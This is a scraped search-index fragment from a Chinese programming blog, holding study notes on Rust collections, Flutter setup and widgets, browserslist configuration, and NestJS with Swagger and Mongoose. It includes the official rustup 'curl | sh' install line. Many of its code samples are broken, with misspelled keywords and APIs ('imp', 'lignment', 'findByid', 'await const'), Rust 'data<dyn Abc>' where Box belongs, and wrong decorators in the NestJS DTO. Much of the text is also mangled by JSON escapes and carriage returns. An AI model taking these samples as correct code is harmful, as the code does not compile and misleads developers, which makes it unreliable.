Demo也可以声明返回了一个类型，这个类型实现了Demo特征，例如：\nfn Demo5() -\u0026gt; impl Demo {\rHome{\ruser: String::from(\u0026quot;xiaochen\u0026quot;),\rpadd: String::from(\u0026quot;abc123456789\u0026quot;),\r};\r}\r集合类型\n集合类型，在rust中是特殊的类型，因为集合类型可以表示多个值，而其他数据类型大多只能表示一个值，集合类型的值被分配到堆内存上，集合类型分3种，分别是vector动态数组（每个元素分配的空间都是一致的，大小，宽度，高度），HashMap KV存储（每个元素都是成对，一个k对应着另一个v），以及String类型\n创建vector动态数组\nlet mut a: Vec(i64) = Vec::new();\r注意：rust编译器可通过a.push()自行推导出数据类型，因此不显式声明类型也是没问题的\n还可以通过vec!宏来创建，例如：\nlet mut a = vec![123,666,888,1000];\r更新动态数组，通过push方法来完成，例如：\nlet mut a = Vec::new();\ra.push(123);\r读取元素，有2种方式，分别是下标索引，get方法，例如：\nlet mut a = vec![123,666,888,1000];\rlet b: \u0026amp;i32 = \u0026amp;a[3];\rmatch a.get(3){\rSome(c) =\u0026gt; println!(\u0026quot;{c}\u0026quot;),\rNone =\u0026gt; println!(\u0026quot;没有这个元素\u0026quot;)\r}\r集合类型的下标索引从0开始，\u0026amp;a[3]是借用a动态数组的第4个元素，也就是1000，最后获取导该元素的引用\nget方法的返回值是Option\u0026lt;\u0026amp;T\u0026gt;，因此需要match来匹配解构出目标值\n下标索引和get方法的区别，很简单，就是下标索引会出现数组越界问题（报错），而get方法通过Option\u0026lt;\u0026amp;T\u0026gt;。如果不存在该值会返回None（安全，不报错）\n动态数组和其他类型一样，超出作用域外，会被自动销毁\n注意：动态数组的大小是可变的，因此当原数组大小不够时，会分配一个更大的内存空间，再将原数组拷贝到这个更大的内存空间的新数组上，因此在push之前不要进行任何引用避免分配到新内存空间后，之前的引用指到一块无效的内存，rust编译器会自动检查，如果在push之前进行了引用（包括不可变借用和可变借用），如果在push之后没有使用，就正常通过，如果使用了，会报错\n可创建指定大小的Vector，通过Vec::with_capacity(10)来完成\n迭代遍历动态数组元素\nlet mut a = vec![123,666,888,1000];\rfor i in \u0026amp;mut a {\r*i += 1;\rprintln!(\u0026quot;{i}\u0026quot;);\r}\r通过枚举类型和特征对象来实现动态数组存储不同类型的元素，例如：\n枚举类型\nenum Abc {\rid(i64),\ruser(String),\rpadd(String),\r}\rfn useraddr(abc:Abc){\rprintln!(\u0026quot;{:?}\u0026quot;,abc);\r}\rfn main(){\rlet a = vec![\rAbc::id(1); Abc::user(\u0026quot;admin\u0026quot;.to_string()); Abc::padd(String::from(\u0026quot;123456\u0026quot;)); ]\rfor i in a {\ruseraddr(i);\r}\r}\r特征对象\ntrait Abc {\rfn useraddr(\u0026amp;self);\r}\rstruct id(i64);\rimp Abc for id {\rfn useraddr(\u0026amp;self) {\rprintln!(\u0026quot;id: {:?}\u0026quot;,self.0)\r}\r}\rstruct user(String);\rimp Abc for user {\rfn useraddr(\u0026amp;self) {\rprintln!(\u0026quot;user: {:?}\u0026quot;,self.0)\r}\r}\rstruct padd(String);\rimp Abc for padd {\rfn useraddr(\u0026amp;self) {\rprintln!(\u0026quot;padd: {:?}\u0026quot;,self.0)\r}\r}\rfn main() {\rlet a: Vec\u0026lt;data\u0026lt;dyn Abc\u0026gt;\u0026gt; = vec![\rdata::new(id(1)),\rdata::new(user(\u0026quot;admin\u0026quot;.to_string())),\rdata::new(padd(\u0026quot;123456\u0026quot;.to_string())),\r];\rfor i in a {\ri.useraddr();\r}\r}\r注意：必须表示数组中存储的是哪个特征的对象，例如上面例子中的Vec\u0026lt;data\u0026gt;，表示是特征Abc的对象\nHashMap KV存储和动态数组不同，存储的是映射的KV键值对，可通过一个键查询到值，查询效率非常高，复杂度为O(1)\n创建HashMap KV存储\n可通过new方法创建，例如：\nuse std::collections::HashMap;\rlet mut hashdata = HashMap::new();\rhashdata.insert(\u0026quot;uesr\u0026quot;,\u0026quot;admin\u0026quot;);\rhashdata.insert(\u0026quot;padd\u0026quot;,\u0026quot;admin12345\u0026quot;);\r注意：HashMap没有包含在Rust的prelude中，需要手动从标准库中use引入\n可创建指定大小的HashMap，通过HashMap::with_capacity(10)来完成\n可以通过迭代器和collect方法创建，例如：\nuse std::collections::HashMap;\rlet DataList = vec![\r(\u0026quot;牛奶\u0026quot;.to_string(), 3),\r(\u0026quot;方便面\u0026quot;.to_string(), 4),\r(\u0026quot;可乐\u0026quot;.to_string(), 3),\r];\rlet MapData: HashMap\u0026lt;_,_\u0026gt; = DataList.into_iter().collect();\rprintln!(\u0026quot;{:?}\u0026quot;,MapData)\r注意：HashMap的所有权取决于kv的类型，如果类型实现了Copy特征，那么改类型被复制到HashMap中，如果没有实现，则所有权转移到HashMap\n获取HashMap元素通过get方法，例如：\nuse std::collections::HashMap;\rlet mut abc = HashMap::new();\rabc.insert(String::from(\u0026quot;雪糕\u0026quot;), 4);\rlet test = String::from(\u0026quot;雪糕\u0026quot;);\rlet testSearch: Option\u0026lt;\u0026amp;i32\u0026gt; = abc.get(\u0026amp;test);\rlet testScore: i32 = testSearch.get(\u0026amp;test).copied().unwrap_or(0);\r上面例子使用了借用规则，避免获取元素时，发生所有权的转移，并且使用Option\u0026lt;\u0026amp;i32\u0026gt;类型，如果没有该对象，返回None，安全\n更新HashMap的中，例如：\nuse std::collections::HashMap;\rlet mut data1 = HashMap::new();\rdata1.insert(\u0026quot;薯条\u0026quot;, 5);\rlet a = data1.insert(\u0026quot;薯条\u0026quot;, 10);\rassert_eq!(a, Some(5));\rlet b = data1.get(\u0026quot;薯条\u0026quot;);\rassert_eq!(b, Some(\u0026amp;10));\rlet c = data1.entry(\u0026quot;啤酒\u0026quot;).or_insert(5);\rassert_eq!(*c, 5);\r上面例子中包含覆盖值；查询新插入的值；查询目标值，如果不存在则插入新值，3种情况\n注意：不是所有类型都可以作为hashmap的key，能否作为取决于类型是否实现了std::cmp::Eq特征（相等比较），目前HashMap使用的哈希函数是SipHash散列函数\n类型转换\n包和模块\n格式化输出\n生命周期\n错误处理\n","permalink":"https://99999.fun/posts/142/","summary":"Rust由非盈利组织Mozilla基金会开发，像著名的Mozilla Firefox浏览器和MDN Web Docs都出自该基金会\n安装\n官方推荐使用Rustup来安装（Rustup是rust的安装器和版本管理工具）\n通过rustup-init来安装Rust\nhttps://www.rust-lang.org/zh-CN/tools/install\nwindows直接安装pustup-init.exe来安装（需联网）,默认通过vc安装，建议选择2自定义安装\nLinux或者macOS则直接执行以下命令\ncurl \u0026ndash;proto \u0026lsquo;=https\u0026rsquo; \u0026ndash;tlsv1.2 -sSf https://sh.rustup.rs | sh\n注意：Rust的一些包，可能还依赖C编译器，因此最好安装一下GCC\n检查是否安装完成\nrustc \u0026ndash;version\n如果喜欢用Visual Studio Code开发，可搭配rust-analyzer插件来使用\n更新rust\nrustup update\n卸载rust和rustup\nrustup self uninstall\n在安装rustup的同时也会安装Cargo\nCargo是rust的项目构建工具和包管理器\n检查是否安装成功\ncargo \u0026ndash;version\n创建第一个rust项目\ncargo new halloword\n其中Cargo.toml文件是项目的依赖库文件\n通过编辑Cargo.toml文件来添加依赖\nrust依赖可通过https://crates.io/查找\n[package]\rname = \u0026quot;hallo_word\u0026quot;\rversion = \u0026quot;0.0.1\u0026quot;\redition = \u0026quot;2021\u0026quot;\r[dependencies]\rhyper = \u0026quot;0.14.20\u0026quot; # 来自https://crates.io/\r# hyper = { git = \u0026quot;https://github.com/hyperium/hyper\u0026quot; } # 来自第三方社区\r# hyper = { path = \u0026quot;.","title":"Rust学习笔记"},{"content":"Flutter是谷歌开源的跨平台UI框架，可以快速在iOS和Android上构建高质量的原生用户界面，可在Windows，Linux，Android，Web，iOS，Mac等6大平台上开发应用\n闲鱼和Now直播，美团，快手都使用了Flutter\n获取Flutter\nhttps://storage.flutter-io.cn/flutter_infra_release/releases/stable/windows/flutter_windows_2.10.3-stable.zip\n添加path环境变量\n由于Flutter库是在google那，因此需要设置第三方可信镜像库\n设置PUB_HOSTED_URL和FLUTTER_STORAGE_BASE_URL环境变量\nPUB_HOSTED_URL设置为https://pub.flutter-io.cn\nFLUTTER_STORAGE_BASE_URL设置为https://storage.flutter-io.cn\n（flutter-io.cn所提供的镜像由中国的Flutter开发者社区提供和维护）\n其他可信第三方镜像库：\n腾讯云镜像\nPUB_HOSTED_URL（https://mirrors.cloud.tencent.com/dart-pub） FLUTTER_STORAGE_BASE_URL（https://mirrors.cloud.tencent.com/flutter）\n清华大学镜像\nPUB_HOSTED_URL（https://mirrors.tuna.tsinghua.edu.cn/dart-pub） FLUTTER_STORAGE_BASE_URL（https://mirrors.tuna.tsinghua.edu.cn/flutter）\n添加Flutter环境变量path，解压路径\\flutter\\bin\n执行where.exe flutter dart，如果有反应，说明path环境配置完成\n（如果要开发安卓的话，需要安装jdk，Android Studio，Android Jdk，可执行flutter doctor检查依赖（如果是X表示没依赖，需要安装））\n这里用Visual Studio Code的Flutter插件\n创建第一个demo（项目名必须全小写，可用_下划线）\nflutter create flutterdemo\n启动项目（编译执行）\nflutter run\nDart是静态类型语言，它会在定义时绑定数据类型（var）\nDart允许一个类中有多个构造函数，在new初始化时，可选择类的某个构造函数\nDart库管理（pub.dev）,在pubspec.yaml添加库\n实质上Dart和JavaScript很相似，只是它有抽象和泛型（ts也有泛型，抽象类就是类似于golang的接口，只定义不实现）\nDart也是单线程执行，主线程外也有宏任务队列和事件队列（可以理解为JavaScript中的宏任务）\nDart执行过程：执行main()函数，判断是微任务还是事件队列，是微任务则插入微任务队列，是宏任务则插入宏任务队列，执行完成后（主线程），会执行微任务队列和事件队列，以及判断微任务队列和事件队列是否为空，当为空时程序执行结束\nflutter项目下的lib/main.dart，class MyApp类下\n修改为 home: const MyHomePage(title: \u0026lsquo;Hallo word\u0026rsquo;), // 当前title信息\n在return Scaffold下的body: Center下的，修改为children: [const Text(\u0026lsquo;Hallo word\u0026rsquo;,),\n运行后可以看到一个title以及内容都为Hallo word的app\nflutter自带了可视化工具，Dart DevTools\n自己写一个main.dart\nvoid main() =\u0026gt; runApp(MyApp());\rclass MyApp extends StatelessWidget{\r@override\rWidget build(BuildContext context){\rreturn MaterialApp(\rtitle: \u0026quot;hallo word\u0026quot;, // app的title\rtheme: ThemeData(\rprimarySwatch: Colors.orange, // 页面的主题颜色\r)\rhome: Scaffold(\rappBar: AppBar(\rtitle: Text(\u0026quot;hallo word\u0026quot;), // 当前页面的title\r),\rbody: Center(\rchild: Text('hallo flutter'), // 当前页面的文本\r),\r),\r);\r}\r}\rflutter run\n（热更新，在执行中输入r或者R）（按p为显示网格，按q为退出，按o为切换android和ios的预览模式）\n这边用安卓实机调试（也可以用安卓模拟器，例如夜神模拟器）\n使用flutter devices命令检查是否寻找到该机，记得开启开发者模式，打开调试，允许调试，开启允许USB安装，数据线连接到电脑，并且安装和实机（虚拟机）中的安卓版本sdk，如果官网打不开，可去https://www.androiddevtools.cn/下载或者在Android Studio中安装，下载安装Google USB Driveer（也可以在Android Studio中安装）\nflutter生命周期\nflutter组件分为无状态组件和有状态组件，无状态组件就是单纯显示内容的，没有逻辑计算，因此只渲染一次，有状态组件就是具备逻辑交互功能的组件，会因为数据发生变化而多次渲染，这个概念和JavaScript是一样的\n无状态组件的生命周期只有一个，build\n有状态组件生命周期分别为\ncreateState：该钩子在StatefulWidget中创建State的方法，当StatefulWidget被调用时会立即执行 createState\ninitState：该钩子为State初始化调用，一般用来初始化State变量的赋值，与服务端交互获取服务端数据以后调用setState来设置初始化State。\ndidChangeDependencies：该钩子在该组件依赖的State发生变化时会被调用（这里的State发生变化指全局State变化，例如当InheritedWidget发送变化），build跟着触发\nbuild：返回需要渲染的Widget，一般有来返回Widget相关逻辑，build会被调用多次\nsetState：当状态发送变化时触发，该钩子被执行后，必然会调用build钩子\nreassemble：该钩子在debug模式下，每次热重载都会执行该钩子，一般来用做一些debug操作\ndidUpdateWidget：该钩子主要是在组件重新构建时调用，例如热重载，该钩子被执行后，必然会调用build钩子\ndeactivate：该钩子在组件被移除节点后会被调用，如果没有插入到其他节点，会继续触发dispose钩子\ndispose：永久移除该组件，释放组件资源，一个组件的生命终点\n在无状态组件中，执行阶段中只有build，也只会执行build函数钩子，因此执行和效率比有状态组件好\n注意：当动态组件更新时，将导致其子组件更新，导致性能问题\n常见组件：\nText: 渲染文本组件\nImage :图片显示组件\nIcon : Icon库组件\nAppBar：页面导航条组件\nRow: 布局组件，使子元素在水平方横向布局\nColumn: 布局组件，使子元素在水平方向纵向布局\nContainer: 容器组件\nExpanded：控制flex布局的占位（用在row或者column组件内部）\nStack：层叠布局组件，在当前组件层叠另一层（和css的z-index类似）\nFadeInImage：加载时的占位组件\nPadding：填充空白区域组件，和css的padding效果类似\nClipRRect：圆角组件，可将子组件处理成圆边角\nText组件，它有TextAlign属性，maxLines属性，overflow属性，style属性\nTextAlign属性就是定义文本对齐方式的，例如：\nchild:Text(\r'hallo word',\rtextAlign:TextAlign.center,\r)\rleft左，center居中，right右\nmaxLines属性是定义文本显示的最大行数数，例如：\nchild:Text(\r'hallo word',\rtextAlign:TextAlign.center,\rmaxLines: 1,\r)\roverflow属性是定义文本溢出时的处理方式，例如：\nchild:Text(\r'hallo word',\rtextAlign:TextAlign.center,\rmaxLines: 1,\roverflow: TextOverflow.ellipsis,\r)\r注意：Text组件是没有宽度的，文本会撑开Text组件，因此还需要搭配Container组件使用，例如：\nContainer(\rwidth: 10,\rchild: Text(\r\u0026quot;hallo wordhallo wordhallo wordhallo wordhallo wordhallo word\u0026quot;,\rtextAlign: TextAlign.left,\roverflow: TextOverflow.ellipsis,\rmaxLines: 1,\r),\r),\rstyle属性可以理解成Flutter组件的css（实质上效果都类似css），例如：\nchild:Text(\r'hallo word',\rtextAlign: TextAlign.center,\rstyle: TextStyle(\rfontSize: 20.0, // 字体大小20\rcolor: Colors.red, // 字体颜色为红色\rdecoration: TextDecoration.underline, // 文本下划线\r),\r)\rContainer组件，有Alignment属性，padding属性，margin属性和decoration属性\nContainer组件宽度和高度，以及颜色可直接通过width和height属性，color属性来定义\nAlignment属性：该属性是定义Container组件的内容的对齐方式，例如：\nchild:Container(\rchild:new Text('hallo word',style: color: Colors.red,),\rlignment: Alignment.center,\r),\r该属性可设置头部对齐方式，底部对齐方式，水平对齐方式，例如topCenter，center，bottomCenter\npadding属性：该属性定义Container组件边缘和子内容的距离，和css的内边距类似，例如：\nchild:Container(\rchild:new Text('hallo word',style: color: Colors.red,),\rlignment: Alignment.center,\rpadding:const EdgeInsets.all(20.0), // 上下左右边距都为20\r),\r如果想单独设置，可padding:const EdgeInsets.fromLTRB(10.0,20.0,30.0,40.0),\n这4个值分别表示左，上，右，下\nmargin属性，自然是定义外边距的，例如margin: const EdgeInsets.all(20.0),\ndecoration属性，用于定义背景，边框，例如：\nchild:Container(\rchild:new Text('hallo word',style: color: Colors.red,),\rlignment: Alignment.center,\rpadding:const EdgeInsets.all(20.0), // 上下左右边距都为20\rdecoration:new BoxDecoration(\rgradient:const LinearGradient(\rcolors:[\rColors.red, // 红色到黑色的渐变\rColors.black,\r]\r),\rborder:Border.all(width:3.0,color:Colors.black) // 黑色边框，边框宽度为3\r),\r),\rImage组件，加载图片有4种方式，分别为：\nImage.asset 加载项目内图片（相对） Image.file 加载本地图片（绝对） Image.memory 加载Uint8List资源图片 Image.network 加载网络图片\n加载网络图片，例如：\nchild:new Image.network(\r'http://xiaochenabc123.test.com/1.jpg',\r),\r加载本地（或者项目）内图片，例如：\nchild:new Image.file(\rFile(\u0026quot;./1.jpg\u0026quot;)\r)\rImage组件的ImageRepeat属性和fit属性\nImageRepeat属性可设置图片重复，例如铺满整个容器，fit属性可设置图片的拉伸和挤压，例如：全图显示，拉伸填满整个容器\n例子：\nchild:new Image.network(\r'http://xiaochenabc123.test.com/1.jpg',\r// ImageRepeat: ImageRepeat.repeat // 横向和纵向重复，直到填满容器\rfit: BoxFit.contain // 显示原比例图片\r),\rImageRepeat.repeat: 横向和纵向重复，填满整个容器 ImageRepeat.repeatX: 横向重复，纵向不重复 ImageRepeat.repeatY：纵向重复，横向不重复\nBoxFit.fill: 图片拉伸，并填满父容器。 BoxFit.contain: 显示原比例图片 BoxFit.cover：可能拉伸，裁切（图片填满整个容器，但是不变形） BoxFit.fitWidth：宽度充满（横向填满），图片可能拉伸，裁切 BoxFit.fitHeight ：高度充满（竖向填满）,图片可能拉伸，裁切 BoxFit.scaleDown：显示原比例图片，但是此属性不允许超过源图片大小\nRow组件：水平布局组件，该组件又分为灵活布局和非灵活布局\n灵活布局：使用Expanded（类似于flex效果），解决非灵活布局的空余或者溢出的情况\n非灵活布局：当子元素不足填满时，会有空余位置，当子元素溢出位置了，会警告\n例如：\nbody: Row(\rchildren: \u0026lt;Widget\u0026gt;[\rExpanded(\rflex: 1,\rchild: Container(\rColors.black,\r),\r),\rExpanded(\rflex: 2,\rchild: Container(\rColors.red,\r),\r),\r] )\rColumn组件：垂直布局组件，例如：\nbody: Column(\rchildren: \u0026lt;Widget\u0026gt;[\rText('hallo word'),\rText('chenjunlinabc'),\r],\rcrossAxisAlignment: CrossAxisAlignment.start,\rmainAxisAlignment: MainAxisAlignment.center,\r),\rCrossAxisAlignment.star：向左对齐 CrossAxisAlignment.end：向右对齐 CrossAxisAlignment.center：居中对齐\nRow和Column组件都存在主轴（main）和纵轴（Cross）\n主轴（main）：在Row组件中水平就是主轴，在Column组件中垂直就是主轴，\n纵轴（Cross）：和主轴（main）相反，在Row组件中垂直就是纵轴，在Column组件中水平就是纵轴\nStack组件\nStack(\rchildren: \u0026lt;Widget\u0026gt;[\rContainer(\rwidth: 100,\rheight: 100,\rcolor: Colors.red,\r),\rContainer(\rwidth: 50,\rheight: 50,\rcolor: Colors.black,\r),\r],\r),\r可以看到上面的两个子组件相交在一起了，Stack组件一样有Alignment属性，来表示对齐方式\n","permalink":"https://99999.fun/posts/141/","summary":"Flutter是谷歌开源的跨平台UI框架，可以快速在iOS和Android上构建高质量的原生用户界面，可在Windows，Linux，Android，Web，iOS，Mac等6大平台上开发应用\n闲鱼和Now直播，美团，快手都使用了Flutter\n获取Flutter\nhttps://storage.flutter-io.cn/flutter_infra_release/releases/stable/windows/flutter_windows_2.10.3-stable.zip\n添加path环境变量\n由于Flutter库是在google那，因此需要设置第三方可信镜像库\n设置PUB_HOSTED_URL和FLUTTER_STORAGE_BASE_URL环境变量\nPUB_HOSTED_URL设置为https://pub.flutter-io.cn\nFLUTTER_STORAGE_BASE_URL设置为https://storage.flutter-io.cn\n（flutter-io.cn所提供的镜像由中国的Flutter开发者社区提供和维护）\n其他可信第三方镜像库：\n腾讯云镜像\nPUB_HOSTED_URL（https://mirrors.cloud.tencent.com/dart-pub） FLUTTER_STORAGE_BASE_URL（https://mirrors.cloud.tencent.com/flutter）\n清华大学镜像\nPUB_HOSTED_URL（https://mirrors.tuna.tsinghua.edu.cn/dart-pub） FLUTTER_STORAGE_BASE_URL（https://mirrors.tuna.tsinghua.edu.cn/flutter）\n添加Flutter环境变量path，解压路径\\flutter\\bin\n执行where.exe flutter dart，如果有反应，说明path环境配置完成\n（如果要开发安卓的话，需要安装jdk，Android Studio，Android Jdk，可执行flutter doctor检查依赖（如果是X表示没依赖，需要安装））\n这里用Visual Studio Code的Flutter插件\n创建第一个demo（项目名必须全小写，可用_下划线）\nflutter create flutterdemo\n启动项目（编译执行）\nflutter run\nDart是静态类型语言，它会在定义时绑定数据类型（var）\nDart允许一个类中有多个构造函数，在new初始化时，可选择类的某个构造函数\nDart库管理（pub.dev）,在pubspec.yaml添加库\n实质上Dart和JavaScript很相似，只是它有抽象和泛型（ts也有泛型，抽象类就是类似于golang的接口，只定义不实现）\nDart也是单线程执行，主线程外也有宏任务队列和事件队列（可以理解为JavaScript中的宏任务）\nDart执行过程：执行main()函数，判断是微任务还是事件队列，是微任务则插入微任务队列，是宏任务则插入宏任务队列，执行完成后（主线程），会执行微任务队列和事件队列，以及判断微任务队列和事件队列是否为空，当为空时程序执行结束\nflutter项目下的lib/main.dart，class MyApp类下\n修改为 home: const MyHomePage(title: \u0026lsquo;Hallo word\u0026rsquo;), // 当前title信息\n在return Scaffold下的body: Center下的，修改为children: [const Text(\u0026lsquo;Hallo word\u0026rsquo;,),\n运行后可以看到一个title以及内容都为Hallo word的app\nflutter自带了可视化工具，Dart DevTools\n自己写一个main.dart\nvoid main() =\u0026gt; runApp(MyApp());\rclass MyApp extends StatelessWidget{\r@override\rWidget build(BuildContext context){\rreturn MaterialApp(\rtitle: \u0026quot;hallo word\u0026quot;, // app的title\rtheme: ThemeData(\rprimarySwatch: Colors.","title":"Flutter框架学习笔记"},{"content":"browserslist是查询浏览器列表的工具，browserslisp的配置可写在package.json中，也可以单独写在.browserslistrc配置⽂件中\nbrowserslist的配置文件会被Autoprefixer，Babel，postcss-preset-env，eslint-plugin-compat，stylelint-no-unsupported-browser-features，postcss-normalize，obsolete-webpack-plugin工具读取，并且对配置的目标浏览器做适配工作\nnpx browserslist可查看根据条件输出的浏览器列表\n查看全球用户份额大于0.2%的浏览器\nnpx browserslist \u0026ldquo;\u0026gt; 0.2%\u0026rdquo;\n查询Chrome最新1个版本\nnpx browserslist \u0026ldquo;last 1 Chrome versions\u0026rdquo;\n查看browserslist的默认配置\nnpx browserslist \u0026ldquo;defaults\u0026rdquo;\nbrowserslist的默认配置为\u0026gt; 0.5% and last 2 versions adn Firefox ESR and not dead\nnot dead的意思是不输出官方不再维护的浏览器（例如ie10），dead是不维护，not是不输出\nand就是和，or是或者\nbrowserslist的配置\npackage.json（browserslist官方推荐用这个）\n\u0026quot;browserslist\u0026quot;: [\r'\u0026gt; 0.2%',\r'last 1 Chrome versions'\r'not dead'\r]\r或者写成\n\u0026quot;browserslist\u0026quot;: [\r'\u0026gt; 0.2% and last 1 Chrome versions and not dead',\r]\r.browserslistrc\n\u0026gt; 0.2% and last 1 Chrome versions and not dead\rbrowserslist数据的优先级：当前项目的package.json的browserslist，当前项目的.browserslistrc，BROWSERSLIST环境变量，browserslist的defaults\n另外还可以设置development（开发环境），production（生产环境的配置），例如：\n\u0026quot;browserslist\u0026quot;: [\r'development':[\r'last 1 Chrome versions',\r'last 1 firefox versions',\r'last 1 safari versions',\r'\u0026gt; 5%',\r],\r'production': [\r'not dead'\r]\r]\r","permalink":"https://99999.fun/posts/140/","summary":"browserslist是查询浏览器列表的工具，browserslisp的配置可写在package.json中，也可以单独写在.browserslistrc配置⽂件中\nbrowserslist的配置文件会被Autoprefixer，Babel，postcss-preset-env，eslint-plugin-compat，stylelint-no-unsupported-browser-features，postcss-normalize，obsolete-webpack-plugin工具读取，并且对配置的目标浏览器做适配工作\nnpx browserslist可查看根据条件输出的浏览器列表\n查看全球用户份额大于0.2%的浏览器\nnpx browserslist \u0026ldquo;\u0026gt; 0.2%\u0026rdquo;\n查询Chrome最新1个版本\nnpx browserslist \u0026ldquo;last 1 Chrome versions\u0026rdquo;\n查看browserslist的默认配置\nnpx browserslist \u0026ldquo;defaults\u0026rdquo;\nbrowserslist的默认配置为\u0026gt; 0.5% and last 2 versions adn Firefox ESR and not dead\nnot dead的意思是不输出官方不再维护的浏览器（例如ie10），dead是不维护，not是不输出\nand就是和，or是或者\nbrowserslist的配置\npackage.json（browserslist官方推荐用这个）\n\u0026quot;browserslist\u0026quot;: [\r'\u0026gt; 0.2%',\r'last 1 Chrome versions'\r'not dead'\r]\r或者写成\n\u0026quot;browserslist\u0026quot;: [\r'\u0026gt; 0.2% and last 1 Chrome versions and not dead',\r]\r.browserslistrc\n\u0026gt; 0.2% and last 1 Chrome versions and not dead\rbrowserslist数据的优先级：当前项目的package.","title":"browserslist的简单配置"},{"content":"NestJS是一个nodejs服务端应用开发框架，基于typescript开发，http服务框架默认为Express，也支持Fastify，支持面向对象，函数式以及函数响应式编程\n安装\nnpm install -g @nestjs/cli\n创建demo项目\nnest new demo\n选择使用包管理器（支持npm，yarn，pnpm）\n创建完成后可以看到src目录，是典型的MVC架构\napp.controller.ts（应用路由控制器，例如Get()方法，该路由控制器将从应用服务文件中获取数据，并且将数据返回到页面上） app.controller.spec.ts（应用控制器单元测试） app.module.ts（应用模块文件，nest模块化，一个nest项目最少有一个模块，通过controllers()方法接收一个模块组(数组形式)，） app.service.ts（应用服务文件，数据来源于该文件） main.ts（应用程序入口文件，实质上是async/await异步函数（bootstrap()）\n从main.ts入口文件可以看出，nest应用实例是基于NestFactory类（该类来源于@nestjs/core，nest核心程序）对外暴露的方法创建的\n启动项目\nnpm run start\n访问http://localhost:3000/，如果看到Hello World!表示启动成功\nnestjs cli支持对mvc模块的生成\n新建nest项目 nest new demo\n打包nest项目 nets build\n运行nest项目 nest start\n查看nest当前项目的一些信息 nest info\n创建控制器 nest g controller 名称 或者 nest g co 名称\n创建服务 nest g service 名称 或者 nest g s 名称\n创建模块 nest g module 名称 或者 nest g mo 名称\n创建异常过滤器 nest g filter 名称\n创建拦截器 nest g interceptor 名称\n创建中间件 nest g middleware 名称\n创建管道 nest g pipe 名称\n创建守卫 nest g gu 名称\n创建具备完整CRUD功能的模块 nest g res 名称\nSwagger是一个用于生成，描述，调试RESTfulAPI的web服务框架，nest提供了模块来调用该框架\n安装Swagger\nnpm install \u0026ndash;save @nestjs/swagger swagger-ui-express\n导入Swagger\nmain.ts\nimport { SwaggerModule, DocumentBuilder } from '@nestjs/swagger';\r在bootstrap(){}内部\nconst options = new DocumentBuilder()\r.setTitle('api test')\r.setDescription('api test app')\r.setVersion('1.0')\r.addTag('cats')\r.build();\rconst document = SwaggerModule.createDocument(app, options);\rSwaggerModule.setup('test', app, document);\r127.0.0.1:3000/test\n因为Swagger提供的是默认api测试，如果想对其他的controller进行测试，直接在controller文件中使用@Apitags装饰器\ntest.controller.ts\n导入\nimport { Apitags } from '@nestjs/swagger';\r@Apitags('test测试')\r返回127.0.0.1:3000/test，可以看到除了默认的外，还有一个test测试的栏目\nApiOperation添加api的注解\n导入\nimport { Apitags, ApiOperation } from '@nestjs/swagger';\r在想要设置的@Post()下，添加@ApiOperation({sumnary:\u0026lsquo;这是注解\u0026rsquo;})\n添加传参数据约束\n从tets.controller.ts中可以看到，create()方法中存在一个类型约束，该约束默认是空的，约束文件一般在dto文件夹下，名称为create-test.dto.ts\nimport { ApiOperation } from '@nestjs/swagger';\rexport class CreateTestDto{\r@ApiOperation({description:'这是用户名'})\rreadonly name: string\r@ApiOperation({description:'这是年龄'})\rage: number\r@ApiOperation({description:'这是密码',default:'123456'})\rpassword: string\r}\r传参必须存在这三个，而且必须符合类型检查，其中readonly表示不可更改，会对目标做一个只读属性的功能，default对应着传参默认值\nmongoose是mongodb对象建模工具\n安装mongoose\nnpm install \u0026ndash;save @nestjs/mongoose mongoose\n导入\napp.module.ts\nimport { MongooseModule } from '@nestjs/mongoose';\r连接mongodb\n@Module({\rimports: [MongooseModule.forRoot('mongodb://localhost:27017/test')],\r})\rmongodb模型注入\n定义scheme\ntest/schemas/test.schema.ts\nimport { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\rimport { Document } from 'mongoose';\rexport type TestDocument = Test \u0026amp; Document;\r@Schema()\rexport classTest extends Document {\r@Prop({required: true type:String})\rname: string;\r@Prop()\rage: number;\r@Prop({required: true,select: false})\rpassword: string;\r}\rexport const TestSchema = SchemaFactory.createForClass(Test);\r使用scheme\ntest.service.ts\n导入需要的模块\nimport { Injectable } from '@nestjs/common';\rimport { InjectModel } from '@nestjs/mongoose';\rimport { InjectModel } from '@nestjs/mongoose';\rimport { TestDocument } from './schemas/test.schema';\r在TestService()内部设置\nconstructor(@InjectModel('Test.name') private testModel: Model\u0026lt;TestDocument\u0026gt;) {}\rasync create(createTestDto: CreateTestDto){\rawait const createdTest = new this.testModel(createTestDto);\rreturn createdTest; // 增\r}\rasync findAll():{\rreturn await this.testModel.find().exec() // 查\r}\rasync findOne(id: string){\rreturn await this.testModel.findByid('id').exec() // 根据id查找\r}\rasync update (id: string, updateTestDto: UpdateTestDto){\rreturn await this.testModel.findByidAndUpdate(id,updateTestDto,{new: true}).exec() // 更改\r}\rasync remove(id: string){\rreturn await this.testModel.findByidAndRemove(id) // 删除\r}\rtest.module.ts\n导入\nimport { MongooseModule } from '@nestjs/mongoose';\rimport { Test, TestSchema} from './schemas/Test.schema';\r在@Module修饰器内部的imports下添加MongooseModule.forFeature([{ name: Test.name, schema: TestSchema }])\n","permalink":"https://99999.fun/posts/139/","summary":"NestJS是一个nodejs服务端应用开发框架，基于typescript开发，http服务框架默认为Express，也支持Fastify，支持面向对象，函数式以及函数响应式编程\n安装\nnpm install -g @nestjs/cli\n创建demo项目\nnest new demo\n选择使用包管理器（支持npm，yarn，pnpm）\n创建完成后可以看到src目录，是典型的MVC架构\napp.controller.ts（应用路由控制器，例如Get()方法，该路由控制器将从应用服务文件中获取数据，并且将数据返回到页面上） app.controller.spec.ts（应用控制器单元测试） app.module.ts（应用模块文件，nest模块化，一个nest项目最少有一个模块，通过controllers()方法接收一个模块组(数组形式)，） app.service.ts（应用服务文件，数据来源于该文件） main.ts（应用程序入口文件，实质上是async/await异步函数（bootstrap()）\n从main.ts入口文件可以看出，nest应用实例是基于NestFactory类（该类来源于@nestjs/core，nest核心程序）对外暴露的方法创建的\n启动项目\nnpm run start\n访问http://localhost:3000/，如果看到Hello World!表示启动成功\nnestjs cli支持对mvc模块的生成\n新建nest项目 nest new demo\n打包nest项目 nets build\n运行nest项目 nest start\n查看nest当前项目的一些信息 nest info\n创建控制器 nest g controller 名称 或者 nest g co 名称\n创建服务 nest g service 名称 或者 nest g s 名称\n创建模块 nest g module 名称 或者 nest g mo 名称\n创建异常过滤器 nest g filter 